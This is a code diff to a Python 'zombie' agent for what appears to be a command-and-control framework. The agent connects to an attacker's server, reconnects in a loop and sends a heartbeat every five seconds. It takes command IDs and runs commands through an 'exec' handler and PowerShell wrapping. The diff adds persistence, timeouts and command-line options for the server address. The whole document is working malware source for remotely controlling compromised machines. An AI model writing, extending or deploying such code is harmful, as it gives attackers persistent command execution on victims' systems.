@@ -5,6 +5,9 @@ This is a template which runs on target system and works as a zombie
 '''
 import re
 import socket
+from threading import Thread
+from time import sleep
+import argparse
 
 codes_list = {
     'exec':'1',
@@ -25,11 +28,18 @@ class Zombie:
         self.server_ip = server_ip
         self.server_port = server_port
         self.is_encrypted = is_encrypted
+        self.connection_is_closed = None
 
     def connect_to_server(self):
         self.got_hello = False # this is true when the zombie gets c2x-hello message
         self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client_socket.connect((self.server_ip, self.server_port))
+        try:
+            self.client_socket.connect((self.server_ip, self.server_port))
+        except:
+            return
+
+        Thread(target=self.send_client_signal).start()
+        self.client_socket.settimeout(5) # set timeout for 5 secs before receiving c2x-hello msg
         self.receive_reply()
 
     def send_hello_back(self):
@@ -46,7 +56,11 @@ class Zombie:
 
     def send_msg(self, msg):
         encoded_msg = msg.encode()
-        self.client_socket.sendall(encoded_msg)
+        try:
+            self.client_socket.sendall(encoded_msg)
+        except:
+            self.close_client_socket()
+            return
 
     def send_encrypted_msg(self, msg):
         pass
@@ -55,11 +69,16 @@ class Zombie:
         while True:
             try:
                 data = self.client_socket.recv(4096)
+            except socket.timeout:
+                self.close_client_socket()
+                return
             except OSError:
                 self.client_socket.close()
                 return
             if not data:
+                self.close_client_socket()
                 continue
+
             data = data.decode()
             if self.is_encrypted:
                 decrypted_reply = self.decrypter(encrypted_msg=data)
@@ -74,21 +93,28 @@ class Zombie:
         if not self.got_hello:
             if reply_msg == 'c2x-hello':
                 self.send_hello_back()
+                self.client_socket.settimeout(None)
                 self.got_hello = True
             else:
-                self.client_socket.close()
-                print('connection closed!')
+                self.close_client_socket()
+                return
 
         elif reply_msg == 'c2x-quit':
-            self.client_socket.close()
+            self.close_client_socket()
             exit()
+
+        elif reply_msg == 'c2x-signal':
+            pass
 
         elif reply_msg.startswith('cid='):
             get_cid_pattern = r'cid=(\d*),'
             cid = re.findall(get_cid_pattern, reply_msg)
             if len(cid) == 1:
                 cid = cid[0]
-                code = codes_list[cid]
+                try:
+                    code = codes_list[cid]
+                except KeyError:
+                    return
 
                 self.interpret_codes(code=code, msg=reply_msg)
 
@@ -104,6 +130,17 @@ class Zombie:
 
         elif code == 'get_whoami':
             self.send_whoami()
+
+    def send_client_signal(self):
+        '''
+        send client signal to server every 5 secs
+        '''
+        while True:
+            if self.connection_is_closed:
+                break
+            sleep(5)
+            if self.got_hello:
+                self.msg_manager(msg='c2x-signal-c')
 
     def powershellize_command(self, command):
         powershell_command = 'powershell "{}"'.format(command)
@@ -154,13 +191,37 @@ class Zombie:
         decrypted_msg = ''
         return decrypted_msg
 
+    def close_client_socket(self):
+        self.connection_is_closed = True
+        self.client_socket.close()
 
-def start_zombie():
+def parse_args():
     server_ip = 'replace_server_ip'
     server_port = 'replace_server_port'
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('--ip', help=f'Server Remote IP [Default : {server_ip}]', default=server_ip)
+    parser.add_argument('--port', help=f'Server Remote Port [Default : {server_port}]', default=server_port)
+
+    args ,unknown = parser.parse_known_args()
+
+    start_zombie(ip=args.ip, port=args.port)
+
+def start_zombie(ip, port):
+    server_ip = ip
+    server_port = port
     server_port = int(server_port)
-    zombie = Zombie(server_ip=server_ip, server_port=server_port, is_encrypted=False)
-    zombie.connect_to_server()
+    while True:
+        try:
+            zombie = Zombie(server_ip=server_ip, server_port=server_port, is_encrypted=False)
+            zombie.connect_to_server()
+            sleep(3)
+        except KeyboardInterrupt:
+            exit()
+
+def start():
+    parse_args()
 
 if __name__ == '__main__':
-    start_zombie()
+    start()
